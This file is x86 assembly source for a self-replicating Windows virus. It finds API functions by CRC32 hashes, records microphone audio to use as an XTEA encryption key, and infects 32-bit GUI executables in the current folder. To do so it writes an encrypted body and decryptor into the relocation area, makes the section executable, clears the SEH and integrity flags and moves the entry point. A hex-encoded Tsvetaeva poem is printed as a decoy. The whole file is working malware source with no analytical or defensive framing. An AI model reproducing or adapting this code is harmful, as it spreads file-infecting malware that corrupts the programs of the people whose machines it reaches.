.386
.model  flat, stdcall
include wave.inc
.code
assume fs:nothing

link_text       proc     near
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh
        db      "Marina Tsvetaeva (1916)"

text_end        label    near
        pop     ecx
        xor     ebx, ebx
        push    ebx
        push    500h
        push    ebx
        push    ebx
        push    offset text_end - offset text_begin
        push    ecx
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
link_text       endp

wave_unit       label    near
        xor     eax, eax
        push    offset link_text
        push    dword ptr fs:[eax]
        mov     dword ptr fs:[eax], esp

wave_launch     label    near

;-------------------------------------------------------------------------------
;here begins code in infected files
;-------------------------------------------------------------------------------

        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     esi, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebp, dword ptr [eax + 18h]
        call    walk_dll
        dd      0b09315f4h                   ;CloseHandle
        dd      040cf273dh                   ;CreateFileMappingW
        dd      0a1efe929h                   ;CreateFileW
        dd      0d82bf69ah                   ;FindClose
        dd      03d3f609fh                   ;FindFirstFileW
        dd      081f39c19h                   ;FindNextFileW
        dd      07fbc7431h                   ;GlobalAlloc
        dd      0636b1e9dh                   ;GlobalFree
        dd      03fc1bd8dh                   ;LoadLibraryA
        dd      0a89b382fh                   ;MapViewOfFile
        dd      0e1bf2253h                   ;SetFileAttributesW
        dd      0391ab6afh                   ;UnmapViewOfFile
        db      0

;-------------------------------------------------------------------------------
;wave API data
;-------------------------------------------------------------------------------

        call    skip_winmm

winmm_name      label    near
        db      "winmm", 0

wave_formatex   label    near
        dw      WAVE_FORMAT_PCM                                     ;WAVEFORMATEX.wFormatTag (uncompressed data LPCM (linear pulse code modulation))
        dw      nChannels                                           ;WAVEFORMATEX.nChannels
        dd      nSamplesPerSec                                      ;WAVEFORMATEX.nSamplesPerSec
        dd      nSamplesPerSec * ((nChannels * wBitsPerSample) / 8) ;WAVEFORMATEX.nAvgBytesPerSec
        dw      (nChannels * wBitsPerSample) / 8                    ;WAVEFORMATEX.nBlockAlign
        dw      wBitsPerSample                                      ;WAVEFORMATEX.wBitsPerSample
        dw      0                                                   ;WAVEFORMATEX.cbSize = sizeof WAVEFORMATEX

winmm_crc       label    near
        dd      0f6129672h                   ;waveInAddBuffer
        dd      06e868a0fh                   ;waveInClose
        dd      024e5f92bh                   ;waveInOpen
        dd      029f8f916h                   ;waveInPreparedHeader
        dd      0e2fe5e44h                   ;waveInStart
        dd      072b55bdbh                   ;waveInUnpreparedHeader
        db      0

wave_setup      label    near

;-------------------------------------------------------------------------------
;alloc recording buffer
;-------------------------------------------------------------------------------

        mov     edi, esp
        mov     ebx, ecx
        mov     ebp, (nSamplesPerSec * RecordingTimeSecs) * ((nChannels * wBitsPerSample) / 8) + sizeof WAVEHDR
        push    ebp
        push    40h
        call    dword ptr [edi + sizeof WINMM + mapStackAPIK32.kGlobalAlloc]
        lea     ecx, dword ptr [eax + sizeof WAVEHDR]
        mov     dword ptr [eax + WAVEHDR.lpData], ecx
        mov     dword ptr [eax + WAVEHDR.dwBufferLength], ebp
        push    eax
        call    wave_opendvc
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        call    dword ptr [esp + sizeof WINMM + mapStackAPIK32.kGlobalFree + 4]

breakpoint      label    near
        int     3

wave_opendvc    label    near

;-------------------------------------------------------------------------------
;setup device
;-------------------------------------------------------------------------------

        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        lea     edx, dword ptr [esi - (offset wave_setup - offset wave_formatex)]
        push    edi
        push    eax
        push    esi
        push    ebx                          ;waveInClose
        mov     esi, esp
        xchg    ebp, eax
        push    WAVE_FORMAT_DIRECT           ;waveInOpen
        push    ebx                          ;waveInOpen
        push    ebx                          ;waveInOpen
        push    edx                          ;waveInOpen
        push    WAVE_MAPPER                  ;waveInOpen
        push    esi                          ;waveInOpen
        call    dword ptr [edi + WINMM.waveInOpen]
        test    eax, eax
        jnz     breakpoint                   ;MMSYSERR_NOERROR == MMSYSERR_BASE + 0
        lods    dword ptr [esi]
        xchg    esi, eax
        pushad
        call    wave_start
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    dword ptr [edi + WINMM.waveInClose]
        push    XTEA_VALUE_KEYSIZE
        pop     ecx
        cmp     dword ptr [ebp + WAVEHDR.dwBytesRecorded], ecx
        jnb     copy_keys
        int     3

wave_start      label    near

;-------------------------------------------------------------------------------
;prepare buffer
;-------------------------------------------------------------------------------

        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        push    sizeof WAVEHDR               ;waveInAddBuffer
        push    ebp                          ;waveInAddBuffer
        push    sizeof WAVEHDR
        push    ebp
        push    esi
        call    dword ptr [edi + WINMM.waveInPreparedHeader]
        push    esi
        call    dword ptr [edi + WINMM.waveInAddBuffer]
        push    esi
        call    dword ptr [edi + WINMM.waveInStart]

waverec_loop    label     near

;-------------------------------------------------------------------------------
;listen some bits...
;-------------------------------------------------------------------------------

        push    sizeof WAVEHDR
        push    ebp
        push    esi
        call    dword ptr [edi + WINMM.waveInUnpreparedHeader]
        cmp     al, WAVERR_STILLPLAYING      ;WAVERR_STILLPLAYING == WAVEERR_BASE + 1
        je      waverec_loop
        int     3

copy_keys       label    near

;-------------------------------------------------------------------------------
;copy keys into decryptor body
;-------------------------------------------------------------------------------

        pop     esi
        lea     edi, dword ptr [esi + (offset decipher_key - offset wave_setup)]
        pop     esi
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     edi
        enter   sizeof WIN32_FIND_DATA * 2, 0
        push    "*"
        mov     ecx, esp
        push    esi
        push    ecx
        call    dword ptr [edi + WINMM.waveInAddBuffer + mapStackAPIK32.kFindFirstFileW + sizeof WINMM.waveInStart]
        xchg    ebp, eax

map_file        label    near
        push    dword ptr [esi + WIN32_FIND_DATA.dwFileAttributes]
        lea     ecx, dword ptr [esi + low WIN32_FIND_DATA.cFileName]
        push    ecx
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    3                            ;GENERIC_READ | GENERIC_WRITE
        push    ecx
        push    FILE_ATTRIBUTE_ARCHIVE
        push    ecx
        call    dword ptr [edi + WINMM.waveInAddBuffer + mapStackAPIK32.kSetFileAttributesW + sizeof WINMM.waveInStart]
        call    dword ptr [edi + WINMM.waveInAddBuffer + mapStackAPIK32.kCreateFileW + sizeof WINMM.waveInStart]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    PAGE_READWRITE
        push    ebx
        push    eax
        call    dword ptr [edi + WINMM.waveInAddBuffer + mapStackAPIK32.kCreateFileMappingW + sizeof WINMM.waveInStart]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    FILE_MAP_WRITE
        push    eax
        call    dword ptr [edi + WINMM.waveInAddBuffer + mapStackAPIK32.kMapViewOfFile + sizeof WINMM.waveInStart]
        push    eax
        pushad
        call    infect_file

delta_mapseh    label    near
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        call    dword ptr [edi + WINMM.waveInAddBuffer + mapStackAPIK32.kUnmapViewOfFile + sizeof WINMM.waveInStart]
        call    dword ptr [edi + WINMM.waveInAddBuffer + mapStackAPIK32.kCloseHandle + sizeof WINMM.waveInStart]
        call    dword ptr [edi + WINMM.waveInAddBuffer + mapStackAPIK32.kCloseHandle + sizeof WINMM.waveInStart]
        call    dword ptr [edi + WINMM.waveInAddBuffer + mapStackAPIK32.kSetFileAttributesW + sizeof WINMM.waveInStart]
        push    esi
        push    ebp
        call    dword ptr [edi + WINMM.waveInAddBuffer + mapStackAPIK32.kFindNextFileW + sizeof WINMM.waveInStart]
        test    eax, eax
        jnz     map_file
        push    ebp
        call    dword ptr [edi + WINMM.waveInAddBuffer + mapStackAPIK32.kFindClose + sizeof WINMM.waveInStart]

inter3          label    near

;-------------------------------------------------------------------------------
;common exit point
;-------------------------------------------------------------------------------

        int     3

infect_file     label    near

;-------------------------------------------------------------------------------
;parse file struct
;signatures must match those of PE files
;-------------------------------------------------------------------------------

        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        cmp     word ptr [eax], "ZM"
        jne     inter3
        mov     edi, eax
        add     eax, dword ptr [eax + IMAGE_DOS_HEADER_E_LFANEW]
        cmp     dword ptr [eax], "EP"
        jne     inter3

;-------------------------------------------------------------------------------
;32-bit machine
;discard DLL files (because they do not have own PEB) and system files
;do not test IMAGE_FILE_32BIT_MACHINE because it is ignored by Windows even for PE32+
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_MACHINE], IMAGE_FILE_MACHINE_I386
        jne     inter3
        movzx   ecx, word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_CHARACTERISTICS]
        test    cl, IMAGE_FILE_EXECUTABLE_IMAGE
        jz      inter3
        test    ch, high (IMAGE_FILE_DLL or IMAGE_FILE_SYSTEM)
        jnz     inter3

;-------------------------------------------------------------------------------
;before check size of optional header make sure optional header is PE32
;IMAGE_NT_OPTIONAL_HDR_MAGIC must match PE32 structure (not ROM, not 64-bit) configuration
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_MAGIC], IMAGE_NT_OPTIONAL_HDR32_MAGIC
        jne     inter3

;-------------------------------------------------------------------------------
;SizeOfOptionalHeader must indicate that it covers at least until reloc fields entries
;-------------------------------------------------------------------------------

        movzx   edx, word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_SIZEOF_OPTIONAL_HEADER]
        cmp     dx, (IMAGE_DIRECTORY_ENTRY_RELOC_TABLE - IMAGE_NT_HEADERS_OPTIONALHEADER_MAGIC) + 8
        jnae    inter3
        cmp     dx, (IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE - IMAGE_NT_HEADERS_OPTIONALHEADER_MAGIC) + 8
        jnae    skip_ldcchk
        cmp     dword ptr [eax + IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE], ebx
        jne     inter3

skip_ldcchk     label    near

;-------------------------------------------------------------------------------
;Windows GUI subsystem file only
;-------------------------------------------------------------------------------

        cmp     word ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_SUBSYSTEM], IMAGE_SUBSYSTEM_WINDOWS_GUI
        jne     inter3

;-------------------------------------------------------------------------------
;reloc place
;-------------------------------------------------------------------------------

        imul    cx, word ptr [eax + IMAGE_NT_HEADERS_FILEHEADER_NUMBER_OF_SECTIONS], IMAGE_SECTION_HEADER_SIZEOF
        lea     esi, dword ptr [eax + edx + (IMAGE_NT_HEADERS_OPTIONALHEADER_MAGIC - IMAGE_SECTION_HEADER_SIZEOF) + IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS]
        add     esi, ecx
        mov     edx, dword ptr [esi]
        mov     bl, IMAGE_DIRECTORY_ENTRY_RELOC_TABLE
        add     ebx, eax
        cmp     dword ptr [ebx], edx
        jne     inter3
        cmp     dword ptr [ebx + 4], (BLOCKSCOUNT * XTEA_VALUE_BLOCKSIZE) + (offset findecryptor - offset pridecryptor) + 20h
        jb      inter3
        pushad
        call    init_xtea
        push    "soli"
        org     $ - 4
        pushad
        call    $ + 5
        org     $ - 4

pridecryptor    label    near
        pop     esi
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.dwImageBaseAddress]
        add     dword ptr [esp + sizeof STACKREGS], eax
        call    init_seh
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        ret

init_seh        label    near
        xor     ecx, ecx
        push    dword ptr fs:[ecx]
        mov     dword ptr fs:[ecx], esp
        push    esi
        push    ebx
        call    initialise

xtea_formulaa   label    near

;-------------------------------------------------------------------------------
;shared code
;formula: (((v << 4) ^ (v >> 5)) + v)
;-------------------------------------------------------------------------------

        mov     edi, edx
        mov     ebx, edx
        shr     edi, 5
        shl     ebx, 4
        xor     edi, ebx
        add     edi, edx
        ret

decipher_key    label    near
        dd      "(o)", "(o)", "(o)", "(o)"

initialise      label    near

;-------------------------------------------------------------------------------
;init main loop
;load 64-bit ciphertext
;-------------------------------------------------------------------------------

        pop     ebp
        mov     cl, BLOCKSCOUNT
        mov     edi, esi

dblock_load     label    near
        push    ecx
        lods    dword ptr [esi]
        xchg    edx, eax
        lods    dword ptr [esi]
        xchg    ecx, eax
        push    esi
        push    edi
        push    XTEA_VALUE_NROUNDS
        pop     esi
        mov     eax, XTEA_VALUE_DELTA * XTEA_VALUE_NROUNDS

xtea_decode     label    near

;-------------------------------------------------------------------------------
;perform rounds of XTEA decryption
;-------------------------------------------------------------------------------

        call    ebp
        call    xtea_keyindex
        sub     ecx, edi
        push    edx
        mov     edx, ecx
        call    ebp
        pop     edx
        sub     eax, XTEA_VALUE_DELTA
        mov     ebx, eax
        call    xtea_indexsub
        sub     edx, edi
        dec     esi
        jnz     xtea_decode
        pop     edi
        xchg    eax, edx
        stos    dword ptr [edi]
        xchg    eax, ecx
        stos    dword ptr [edi]
        pop     esi
        pop     ecx
        loop    dblock_load
        pop     ebx
        ret

xtea_keyindex   label    near

;-------------------------------------------------------------------------------
;shared code
;formula: (sum + key[(sum >> 11) & 3])
;then there is a variation when "shr ebx, 0bh" is not used, but for that setup ebx
;and go straight to xtea_indexsub
;-------------------------------------------------------------------------------

        mov     ebx, eax
        shr     ebx, 0bh

xtea_indexsub   label    near
        and     ebx, 3
        mov     ebx, dword ptr [ebp + ebx * 4 + (offset decipher_key - offset xtea_formulaa)]
        add     ebx, eax
        xor     edi, ebx
        ret

findecryptor    label    near

init_xtea       label    near

;-------------------------------------------------------------------------------
;insert code to save all GPR and skip encrypted body
;-------------------------------------------------------------------------------

        mov     eax, dword ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_ADDRESS_OF_ENTRYPOINT]
        add     edi, dword ptr [esi + (IMAGE_SECTION_HEADER_POINTER_TO_RAW_DATA - IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS)]
        pop     esi
        movs    byte ptr [edi], byte ptr [esi]
        stos    dword ptr [edi]
        movs    word ptr [edi], word ptr [esi]
        mov     eax, BLOCKSCOUNT * XTEA_VALUE_BLOCKSIZE 
        stos    dword ptr [edi]

;-------------------------------------------------------------------------------
;init main loop
;load 64-bit plaintext
;-------------------------------------------------------------------------------

        push    esi
        push    BLOCKSCOUNT
        pop     ecx
        lea     ebp, dword ptr [esi + (offset xtea_formulaa - offset pridecryptor)]
        sub     esi, offset pridecryptor - offset wave_launch

eblock_load     label    near
        push    ecx
        lods    dword ptr [esi]
        xchg    ecx, eax
        lods    dword ptr [esi]
        xchg    edx, eax
        push    esi
        push    edi
        xor     eax, eax
        push    XTEA_VALUE_NROUNDS
        pop     esi

xtea_encode     label    near

;-------------------------------------------------------------------------------
;perform rounds of XTEA encryption
;-------------------------------------------------------------------------------

        call    ebp
        mov     ebx, eax
        call    xtea_indexsub
        add     ecx, edi
        add     eax, XTEA_VALUE_DELTA
        push    edx
        mov     edx, ecx
        call    ebp
        pop     edx
        call    xtea_keyindex
        add     edx, edi
        dec     esi
        jnz     xtea_encode
        pop     edi
        xchg    eax, ecx
        stos    dword ptr [edi]
        xchg    eax, edx
        stos    dword ptr [edi]
        pop     esi
        pop     ecx
        loop    eblock_load

;-------------------------------------------------------------------------------
;copy decryptor
;-------------------------------------------------------------------------------

        pop     esi
        mov     cl, offset findecryptor - offset pridecryptor
        rep     movs byte ptr [edi], byte ptr [esi]
        popad

;-------------------------------------------------------------------------------
;unset *_NX_COMPAT below, then might not need IMAGE_SCN_MEM_EXECUTE in section flags
;-------------------------------------------------------------------------------

        or      byte ptr [esi + (IMAGE_SECTION_HEADER_CHARACTERISTICS - IMAGE_SECTION_HEADER_VIRTUAL_ADDRESS) + 3], (IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_WRITE) shr 18h

;-------------------------------------------------------------------------------
;alter entrypoint
;unset *_NO_SEH and *_FORCE_INTEGRITY flags in DllCharacteristics field
;clean up reloc data directory entries
;-------------------------------------------------------------------------------

        and     word ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_DLLCHARACTERISTICS], not (IMAGE_DLLCHARACTERISTICS_NO_SEH or IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY)
        xor     ecx, ecx
        mov     dword ptr [ebx], ecx
        mov     dword ptr [ebx + 4], ecx
        mov     dword ptr [eax + IMAGE_NT_HEADERS_OPTIONALHEADER_ADDRESS_OF_ENTRYPOINT], edx
        int     3

skip_winmm      label    near

;-------------------------------------------------------------------------------
;get winmm APIs
;-------------------------------------------------------------------------------

        pop     esi
        push    esi
        call    dword ptr [esp + mapStackAPIK32.kLoadLibraryA + sizeof STACKREGS.RegEsi]
        xchg    ebp, eax
        add     esi, "o"
        org     $-1
        db      offset winmm_crc - offset winmm_name
        push    esi

walk_dll        label    near

;-------------------------------------------------------------------------------
;DLL walker
;-------------------------------------------------------------------------------

        pop     esi
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER_E_LFANEW]
        mov     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER_E_LFANEW shl 1]
        add     ebx, ebp
        cdq

walk_names      label    near
        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_NAMES]
        add     edi, ebp
        inc     edx
        mov     edi, dword ptr [edi + edx * 4]
        add     edi, ebp
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        jne     walk_names

;-------------------------------------------------------------------------------
;get API address
;-------------------------------------------------------------------------------

        mov     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_NAME_ORDINALS]
        add     edi, ebp
        movzx   edi, word ptr [edi + edx * 2]
        mov     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY_ADDRESS_OF_FUNCTIONS]
        add     eax, ebp
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        sub     cl, byte ptr [esi]
        jnz     walk_names
        inc     esi
        jmp     esi
wave_end        label    near
end     wave_unit